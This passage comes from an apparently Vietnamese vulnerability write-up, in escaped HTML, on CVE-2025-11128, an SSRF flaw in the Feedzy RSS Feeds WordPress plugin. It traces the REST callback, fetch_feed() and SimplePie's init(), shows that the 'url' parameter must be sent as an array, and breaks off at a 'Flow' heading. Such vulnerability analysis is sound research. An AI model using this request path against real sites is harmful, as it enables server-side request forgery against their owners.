vào một &lt;strong&gt;string&lt;/strong&gt;, PHP sẽ ném lỗi:&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;strong&gt;Exception has occurred.&lt;/strong&gt;&#xA;TypeError: count(): Argument #1 ($value) must be of type Countable|array, string given&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;Vì vậy, khi gửi request đến endpoint, cần truyền tham số &lt;code&gt;url&lt;/code&gt; dưới dạng &lt;strong&gt;mảng&lt;/strong&gt;, ví dụ:&#xA;&lt;code&gt;url[0]=&amp;quot;http://example.com&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;feedzy_rest_route()&lt;/code&gt; được đăng ký làm callback cho API trên:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function feedzy_rest_route( $data ) {&#xA;    $feed = $data;&#xA;    if ( isset( $data[&amp;#39;feeds&amp;#39;] ) ) {&#xA;        $feed_category = $this-&amp;gt;feedzy_sanitize_categories( $data[&amp;#39;feeds&amp;#39;] );&#xA;        if ( $feed_category ) {&#xA;            $data[&amp;#39;url&amp;#39;] = $feed_category;&#xA;        }&#xA;    }&#xA;    if ( ! empty( $data[&amp;#39;url&amp;#39;] ) ) {&#xA;        $feed = $data[&amp;#39;url&amp;#39;];&#xA;    } elseif ( ! empty( $data[&amp;#39;category&amp;#39;] ) ) {&#xA;        $feed = $data[&amp;#39;category&amp;#39;];&#xA;    }&#xA;&#xA;    $url = &amp;#39;&amp;#39;;&#xA;    if ( ! $feed instanceof \WP_REST_Request ) {&#xA;        $url = $feed;&#xA;    }&#xA;&#xA;    $meta_args = array(&#xA;        &amp;#39;date_format&amp;#39; =&amp;gt; get_option( &amp;#39;date_format&amp;#39; ),&#xA;        &amp;#39;time_format&amp;#39; =&amp;gt; get_option( &amp;#39;time_format&amp;#39; ),&#xA;    );&#xA;&#xA;    $instance = Feedzy_Rss_Feeds::instance();&#xA;    $admin    = $instance-&amp;gt;get_admin();&#xA;    $feed     = $admin-&amp;gt;fetch_feed( $url, &amp;#39;12_hours&amp;#39;, array( &amp;#39;&amp;#39; ) );&#xA;    $feedy    = array();&#xA;&#xA;    if ( ! $feed-&amp;gt;init() ) {&#xA;        $feedy[&amp;#39;error&amp;#39;] = __( &amp;#39;Invalid Feed URL&amp;#39;, &amp;#39;feedzy-rss-feeds&amp;#39; );&#xA;        header( &amp;#39;Content-Type: application/json; charset=&amp;#39; . get_option( &amp;#39;blog_charset&amp;#39; ) );&#xA;        return $feedy;&#xA;    }&#xA;&#xA;    if ( ( ! $feed-&amp;gt;get_title() ) &amp;amp;&amp;amp; ( ! $feed-&amp;gt;get_title() ) &amp;amp;&amp;amp; ( ! $feed-&amp;gt;get_title() ) ) {&#xA;        $feedy[&amp;#39;channel&amp;#39;] = null;&#xA;    } else {&#xA;        $feedy[&amp;#39;channel&amp;#39;] = array(&#xA;            &amp;#39;title&amp;#39;       =&amp;gt; ( ( $feed-&amp;gt;get_title() ) ? $feed-&amp;gt;get_title() : null ),&#xA;            &amp;#39;description&amp;#39; =&amp;gt; ( ( $feed-&amp;gt;get_description() ) ? $feed-&amp;gt;get_description() : null ),&#xA;            &amp;#39;permalink&amp;#39;   =&amp;gt; ( ( $feed-&amp;gt;get_permalink() ) ? $feed-&amp;gt;get_permalink() : null ),&#xA;        );&#xA;    }&#xA;&#xA;    $feedy[&amp;#39;items&amp;#39;] = array();&#xA;    $items          = $feed-&amp;gt;get_items();&#xA;    $is_multiple    = ! empty( $feed-&amp;gt;multifeed_url ) &amp;amp;&amp;amp; is_array( $feed-&amp;gt;multifeed_url );&#xA;    foreach ( $items as $item ) {&#xA;        $item_attrs = apply_filters( &amp;#39;feedzy_item_filter&amp;#39;, array(), $item );&#xA;&#xA;        array_push(&#xA;            $feedy[&amp;#39;items&amp;#39;],&#xA;            array(&#xA;                &amp;#39;title&amp;#39;       =&amp;gt; ( ( $item-&amp;gt;get_title() ) ? $item-&amp;gt;get_title() : null ),&#xA;                &amp;#39;link&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_permalink() ) ? $item-&amp;gt;get_permalink() : null ),&#xA;                &amp;#39;creator&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_author() ) ? $item-&amp;gt;get_author()-&amp;gt;get_name() : null ),&#xA;                &amp;#39;source&amp;#39;      =&amp;gt; $is_multiple &amp;amp;&amp;amp; $item-&amp;gt;get_feed()-&amp;gt;get_title() ? $item-&amp;gt;get_feed()-&amp;gt;get_title() : &amp;#39;&amp;#39;,&#xA;                &amp;#39;pubDate&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) : null ),&#xA;                &amp;#39;date&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;date_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;                &amp;#39;time&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;time_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;                &amp;#39;description&amp;#39; =&amp;gt; isset( $item_attrs[&amp;#39;item_description&amp;#39;] ) ? $item_attrs[&amp;#39;item_description&amp;#39;] : ( $item-&amp;gt;get_description() ? $item-&amp;gt;get_description() : null ),&#xA;                &amp;#39;thumbnail&amp;#39;   =&amp;gt; $admin-&amp;gt;feedzy_retrieve_image( $item ),&#xA;                &amp;#39;default_img&amp;#39; =&amp;gt; apply_filters( &amp;#39;feedzy_default_image&amp;#39;, &amp;#39;&amp;#39;, $url ),&#xA;                &amp;#39;price&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_price&amp;#39;] ) ? $item_attrs[&amp;#39;item_price&amp;#39;] : null,&#xA;                &amp;#39;media&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_media&amp;#39;] ) ? $item_attrs[&amp;#39;item_media&amp;#39;] : null,&#xA;                &amp;#39;categories&amp;#39;  =&amp;gt; isset( $item_attrs[&amp;#39;item_categories&amp;#39;] ) ? $item_attrs[&amp;#39;item_categories&amp;#39;] : null,&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    header( &amp;#39;Content-Type: application/json; charset=&amp;#39; . get_option( &amp;#39;blog_charset&amp;#39; ) );&#xA;    $output = $feedy;&#xA;    return $output;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Logic của hàm:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Nhận và xử lý dữ liệu đầu vào&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$feed = $data;&#xA;if ( isset( $data[&amp;#39;feeds&amp;#39;] ) ) {&#xA;    $feed_category = $this-&amp;gt;feedzy_sanitize_categories( $data[&amp;#39;feeds&amp;#39;] );&#xA;    if ( $feed_category ) {&#xA;        $data[&amp;#39;url&amp;#39;] = $feed_category;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Hàm kiểm tra nếu request có chứa tham số &lt;code&gt;feeds&lt;/code&gt;, nó sẽ được &lt;strong&gt;làm sạch&lt;/strong&gt; (sanitize) qua &lt;code&gt;feedzy_sanitize_categories()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Nếu hợp lệ, kết quả được gán lại cho &lt;code&gt;$data[&#39;url&#39;]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Ưu tiên chọn nguồn dữ liệu &lt;code&gt;$feed&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $data[&amp;#39;url&amp;#39;] ) ) {&#xA;    $feed = $data[&amp;#39;url&amp;#39;];&#xA;} elseif ( ! empty( $data[&amp;#39;category&amp;#39;] ) ) {&#xA;    $feed = $data[&amp;#39;category&amp;#39;];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nếu có &lt;code&gt;url&lt;/code&gt; → dùng làm nguồn chính.&lt;/li&gt;&#xA;&lt;li&gt;Nếu không có &lt;code&gt;url&lt;/code&gt; → dùng &lt;code&gt;category&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;→ Đây là nơi đầu vào người dùng (&lt;code&gt;url&lt;/code&gt;) được chuyển tiếp sang quá trình fetch feed.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Chuẩn bị biến &lt;code&gt;$url&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$url = &amp;#39;&amp;#39;;&#xA;if ( ! $feed instanceof \WP_REST_Request ) {&#xA;    $url = $feed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nếu &lt;code&gt;$feed&lt;/code&gt; &lt;strong&gt;không phải là đối tượng WP_REST_Request&lt;/strong&gt;, nó được gán cho &lt;code&gt;$url&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Thực tế &lt;code&gt;$feed&lt;/code&gt; thường là &lt;strong&gt;một chuỗi URL hoặc mảng URL&lt;/strong&gt; được lấy từ request.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Gọi đến core function xử lý&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$instance = Feedzy_Rss_Feeds::instance();&#xA;$admin    = $instance-&amp;gt;get_admin();&#xA;$feed     = $admin-&amp;gt;fetch_feed( $url, &amp;#39;12_hours&amp;#39;, array( &amp;#39;&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Gọi &lt;code&gt;Feedzy_Rss_Feeds::instance()&lt;/code&gt; để lấy instance chính của plugin.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Dùng &lt;code&gt;$admin-&amp;gt;fetch_feed()&lt;/code&gt; để &lt;strong&gt;tải feed từ URL&lt;/strong&gt; (với thời gian cache 12 giờ).&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;⚠️ Đây chính là nơi có thể xảy ra SSRF nếu &lt;code&gt;$url&lt;/code&gt; đến từ input không kiểm soát.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Kiểm tra lỗi tải RSS&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! $feed-&amp;gt;init() ) {&#xA;    $feedy[&amp;#39;error&amp;#39;] = __( &amp;#39;Invalid Feed URL&amp;#39;, &amp;#39;feedzy-rss-feeds&amp;#39; );&#xA;    return $feedy;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nếu &lt;code&gt;init()&lt;/code&gt; thất bại → trả về lỗi JSON &lt;code&gt;&amp;quot;Invalid Feed URL&amp;quot;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Trích xuất thông tin kênh (channel)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( ! $feed-&amp;gt;get_title() ) &amp;amp;&amp;amp; ... ) {&#xA;    $feedy[&amp;#39;channel&amp;#39;] = null;&#xA;} else {&#xA;    $feedy[&amp;#39;channel&amp;#39;] = array(&#xA;        &amp;#39;title&amp;#39; =&amp;gt; $feed-&amp;gt;get_title(),&#xA;        &amp;#39;description&amp;#39; =&amp;gt; $feed-&amp;gt;get_description(),&#xA;        &amp;#39;permalink&amp;#39; =&amp;gt; $feed-&amp;gt;get_permalink(),&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nếu feed không có tiêu đề → gán &lt;code&gt;null&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ngược lại → tạo thông tin channel chuẩn (title, description, link).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;Lặp qua từng item trong feed&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( $items as $item ) {&#xA;    $item_attrs = apply_filters( &amp;#39;feedzy_item_filter&amp;#39;, array(), $item );&#xA;    array_push(&#xA;        $feedy[&amp;#39;items&amp;#39;],&#xA;        array(&#xA;            &amp;#39;title&amp;#39;       =&amp;gt; ( ( $item-&amp;gt;get_title() ) ? $item-&amp;gt;get_title() : null ),&#xA;            &amp;#39;link&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_permalink() ) ? $item-&amp;gt;get_permalink() : null ),&#xA;            &amp;#39;creator&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_author() ) ? $item-&amp;gt;get_author()-&amp;gt;get_name() : null ),&#xA;            &amp;#39;source&amp;#39;      =&amp;gt; $is_multiple &amp;amp;&amp;amp; $item-&amp;gt;get_feed()-&amp;gt;get_title() ? $item-&amp;gt;get_feed()-&amp;gt;get_title() : &amp;#39;&amp;#39;,&#xA;            &amp;#39;pubDate&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) : null ),&#xA;            &amp;#39;date&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;date_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;            &amp;#39;time&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;time_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;            &amp;#39;description&amp;#39; =&amp;gt; isset( $item_attrs[&amp;#39;item_description&amp;#39;] ) ? $item_attrs[&amp;#39;item_description&amp;#39;] : ( $item-&amp;gt;get_description() ? $item-&amp;gt;get_description() : null ),&#xA;            &amp;#39;thumbnail&amp;#39;   =&amp;gt; $admin-&amp;gt;feedzy_retrieve_image( $item ),&#xA;            &amp;#39;default_img&amp;#39; =&amp;gt; apply_filters( &amp;#39;feedzy_default_image&amp;#39;, &amp;#39;&amp;#39;, $url ),&#xA;            &amp;#39;price&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_price&amp;#39;] ) ? $item_attrs[&amp;#39;item_price&amp;#39;] : null,&#xA;            &amp;#39;media&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_media&amp;#39;] ) ? $item_attrs[&amp;#39;item_media&amp;#39;] : null,&#xA;            &amp;#39;categories&amp;#39;  =&amp;gt; isset( $item_attrs[&amp;#39;item_categories&amp;#39;] ) ? $item_attrs[&amp;#39;item_categories&amp;#39;] : null,&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;Trả kết quả JSON&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;header( &amp;#39;Content-Type: application/json; charset=&amp;#39; . get_option( &amp;#39;blog_charset&amp;#39; ) );&#xA;return $feedy;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Mỗi bài viết (item) được lấy ra và ánh xạ thành mảng JSON có: Tiêu đề, liên kết, tác giả, ngày, mô tả, ảnh thumbnail, v.v.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ghi chú&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;Nội dung được trả về chứa các trường chỉ định =&amp;gt; Cho thấy dữ liệu fetch từ URL là một file có cấu trúc bao gồm các trường ở trên nên ta không thể đọc một file bất kỳ được.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;Ta phân tích &lt;code&gt;fetch_feed()&lt;/code&gt; để xem file nó thực sự đọc được là gì:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function fetch_feed( $feed_url, $cache = &amp;#39;12_hours&amp;#39;, $sc = &amp;#39;&amp;#39; ) {&#xA;    // Load SimplePie if not already.&#xA;    do_action( &amp;#39;feedzy_pre_http_setup&amp;#39;, $feed_url );&#xA;    if ( function_exists( &amp;#39;feedzy_amazon_get_locale_hosts&amp;#39; ) ) {&#xA;        $amazon_hosts     = feedzy_amazon_get_locale_hosts();&#xA;        $is_amazon_source = false;&#xA;        if ( is_array( $feed_url ) ) {&#xA;            $url_host         = array_map(&#xA;                function ( $url ) {&#xA;                    return &amp;#39;webservices.&amp;#39; . wp_parse_url( $url, PHP_URL_HOST );&#xA;                },&#xA;                $feed_url&#xA;            );&#xA;            $url_host         = array_diff( $url_host, $amazon_hosts );&#xA;            $is_amazon_source = ! empty( $amazon_hosts ) &amp;amp;&amp;amp; empty( $url_host );&#xA;        } else {&#xA;            $url_host         = &amp;#39;webservices.&amp;#39; . wp_parse_url( $feed_url, PHP_URL_HOST );&#xA;            $is_amazon_source = ! empty( $amazon_hosts ) &amp;amp;&amp;amp; in_array( $url_host, $amazon_hosts, true );&#xA;        }&#xA;        if ( $is_amazon_source ) {&#xA;            $feed = $this-&amp;gt;init_amazon_api(&#xA;                $feed_url,&#xA;                isset( $sc[&amp;#39;refresh&amp;#39;] ) ? $sc[&amp;#39;refresh&amp;#39;] : &amp;#39;12_hours&amp;#39;,&#xA;                array(&#xA;                    &amp;#39;number_of_item&amp;#39; =&amp;gt; isset( $sc[&amp;#39;max&amp;#39;] ) ? $sc[&amp;#39;max&amp;#39;] : 5,&#xA;                    &amp;#39;no-cache&amp;#39;       =&amp;gt; false,&#xA;                )&#xA;            );&#xA;            return $feed;&#xA;        }&#xA;    }&#xA;    // Load SimplePie Instance.&#xA;    $feed = $this-&amp;gt;init_feed( $feed_url, $cache, $sc ); // Not used as log as #41304 is Opened.&#xA;&#xA;    // Report error when is an error loading the feed.&#xA;    if ( is_wp_error( $feed ) ) {&#xA;        // Fallback for different edge cases.&#xA;        if ( is_array( $feed_url ) ) {&#xA;            $feed_url = array_map( &amp;#39;html_entity_decode&amp;#39;, $feed_url );&#xA;        } else {&#xA;            $feed_url = html_entity_decode( $feed_url );&#xA;        }&#xA;&#xA;        $feed_url = $this-&amp;gt;get_valid_source_urls( $feed_url, $cache );&#xA;&#xA;        $feed = $this-&amp;gt;init_feed( $feed_url, $cache, $sc ); // Not used as log as #41304 is Opened.&#xA;&#xA;    }&#xA;&#xA;    do_action( &amp;#39;feedzy_post_http_teardown&amp;#39;, $feed_url );&#xA;&#xA;    return $feed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu &lt;code&gt;feedzy_amazon_get_locale_hosts&lt;/code&gt; có tồn tại thì thực hiện logic trong &lt;code&gt;if&lt;/code&gt; và trả về &lt;code&gt;$feed&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( function_exists( &amp;#39;feedzy_amazon_get_locale_hosts&amp;#39; ) ) {&#xA;    ...&#xA;    return $feed&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi tìm kiếm hàm &lt;code&gt;feedzy_amazon_get_locale_hosts&lt;/code&gt; trong toàn bộ thư mục của plugin, ta nhận thấy hàm này &lt;strong&gt;không được khai báo hoặc định nghĩa ở bất kỳ đâu&lt;/strong&gt;.&#xA;Do đó, điều kiện kiểm tra &lt;code&gt;if ( function_exists( &#39;feedzy_amazon_get_locale_hosts&#39; ) )&lt;/code&gt; sẽ luôn &lt;strong&gt;trả về &lt;code&gt;false&lt;/code&gt;&lt;/strong&gt;, khiến luồng thực thi &lt;strong&gt;bỏ qua nhánh đó&lt;/strong&gt; và &lt;strong&gt;tiếp tục gọi hàm &lt;code&gt;init_feed()&lt;/code&gt;&lt;/strong&gt; sau đó &lt;strong&gt;check error&lt;/strong&gt; và trả về feed.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/function.png&#34; title=&#34;Kết quả tìm kiếm feedzy_amazon_get_locale_hosts&#34; data-thumbnail=&#34;/posts/2025-10-30-cve-2025-11128/function.png&#34; data-sub-html=&#34;&lt;h2&gt;Function&lt;/h2&gt;&lt;p&gt;Kết quả tìm kiếm feedzy_amazon_get_locale_hosts&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-30-cve-2025-11128/function.png&#39; alt=&#34;Function&#34; height=&#34;454&#34; width=&#34;1494&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả tìm kiếm feedzy_amazon_get_locale_hosts&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function init_feed( $feed_url, $cache, $sc, $allow_https = FEEDZY_ALLOW_HTTPS ) {&#xA;    ...&#xA;    $feed = new Feedzy_Rss_Feeds_Util_SimplePie( $sc );&#xA;    $feed-&amp;gt;set_file_class( &amp;#39;WP_SimplePie_File&amp;#39; );&#xA;    $default_agent = $this-&amp;gt;get_default_user_agent( $feed_url );&#xA;    $feed-&amp;gt;set_useragent( apply_filters( &amp;#39;http_headers_useragent&amp;#39;, $default_agent ) );&#xA;   &#xA;&#xA;    // Do not use force_feed for multiple URLs.&#xA;    $feed-&amp;gt;force_feed( apply_filters( &amp;#39;feedzy_force_feed&amp;#39;, ( is_string( $feed_url ) || ( is_array( $feed_url ) &amp;amp;&amp;amp; 1 === count( $feed_url ) ) ) ) );&#xA;&#xA;    do_action( &amp;#39;feedzy_modify_feed_config&amp;#39;, $feed );&#xA;&#xA;    $cloned_feed = clone $feed;&#xA;&#xA;    // set the url as the last step, because we need to be able to clone this feed without the url being set&#xA;    // so that we can fall back to raw data in case of an error.&#xA;    $feed-&amp;gt;set_feed_url( $feed_url );&#xA;&#xA;    // Allow unsafe html.&#xA;    if ( defined( &amp;#39;FEEDZY_ALLOW_UNSAFE_HTML&amp;#39; ) &amp;amp;&amp;amp; FEEDZY_ALLOW_UNSAFE_HTML ) {&#xA;        $feed-&amp;gt;strip_htmltags( false );&#xA;    }&#xA;&#xA;    if ( isset( $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] ) ) {&#xA;        // phpcs:ignore WordPressVIPMinimum.Variables.RestrictedVariables.cache_constraints___SERVER__HTTP_USER_AGENT__&#xA;        $set_server_agent = sanitize_text_field( wp_unslash( $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] ) . SIMPLEPIE_USERAGENT );&#xA;        $feed-&amp;gt;set_useragent( apply_filters( &amp;#39;http_headers_useragent&amp;#39;, $set_server_agent ) );&#xA;    }&#xA;&#xA;    $feed-&amp;gt;init();&#xA;&#xA;    ...&#xA;    return $feed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;init_feed()&lt;/code&gt; chịu trách nhiệm khởi tạo và cấu hình đối tượng &lt;strong&gt;SimplePie&lt;/strong&gt;, setup một số thông tin cơ bản và gọi đến &lt;code&gt;$feed-&amp;gt;init()&lt;/code&gt; để gửi request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function init() {&#xA;    // Check absolute bare minimum requirements.&#xA;    if (!extension_loaded(&amp;#39;xml&amp;#39;) || !extension_loaded(&amp;#39;pcre&amp;#39;)) {&#xA;        $this-&amp;gt;error = &amp;#39;XML or PCRE extensions not loaded!&amp;#39;;&#xA;        return false;&#xA;    }&#xA;    // Then check the xml extension is sane (i.e., libxml 2.7.x issue on PHP &amp;lt; 5.2.9 and libxml 2.7.0 to 2.7.2 on any version) if we don&amp;#39;t have xmlreader.&#xA;    elseif (!extension_loaded(&amp;#39;xmlreader&amp;#39;)) {&#xA;        static $xml_is_sane = null;&#xA;        if ($xml_is_sane === null) {&#xA;            $parser_check = xml_parser_create();&#xA;            xml_parse_into_struct($parser_check, &amp;#39;&amp;lt;foo&amp;gt;&amp;amp;amp;&amp;lt;/foo&amp;gt;&amp;#39;, $values);&#xA;            xml_parser_free($parser_check);&#xA;            $xml_is_sane = isset($values[0][&amp;#39;value&amp;#39;]);&#xA;        }&#xA;        if (!$xml_is_sane) {&#xA;            return false;&#xA;        }&#xA;    }&#xA;    ...&#xA;    if ($this-&amp;gt;feed_url === null &amp;amp;&amp;amp; $this-&amp;gt;raw_data === null) {&#xA;        return false;&#xA;    }&#xA;&#xA;    $cache = false;&#xA;    if ($this-&amp;gt;enable_cache) {&#xA;        $cache = $this-&amp;gt;get_cache($this-&amp;gt;feed_url);&#xA;    }&#xA;    if (($fetched = $this-&amp;gt;fetch_data($cache)) === true) {&#xA;        return true;&#xA;    } elseif ($fetched === false) {&#xA;        return false;&#xA;    }&#xA;&#xA;    [$headers, $sniffed] = $fetched;&#xA;&#xA;    if (empty($this-&amp;gt;raw_data)) {&#xA;        $this-&amp;gt;error = &amp;#34;Empty response from `$this-&amp;gt;feed_url`&amp;#34;;&#xA;        return false;&#xA;    }&#xA;&#xA;    // Parse&#xA;    foreach ($this-&amp;gt;get_possible_encodings($headers, $sniffed) as $encoding) {&#xA;        $utf8_data = $this-&amp;gt;convert_to_utf8($this-&amp;gt;raw_data, $encoding);&#xA;        $parser = $this-&amp;gt;registry-&amp;gt;create(Parser::class);&#xA;        if ($parser-&amp;gt;parse($utf8_data, &amp;#39;UTF-8&amp;#39;, $this-&amp;gt;permanent_url)) {&#xA;            $this-&amp;gt;data = $parser-&amp;gt;get_data();&#xA;            return true;&#xA;        }&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Ta thấy file được yêu cầu ở đâu là dạng XML&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;fetch_data($cache)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đây là nơi thực hiện HTTP request đến URL mà người dùng gửi lên.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path 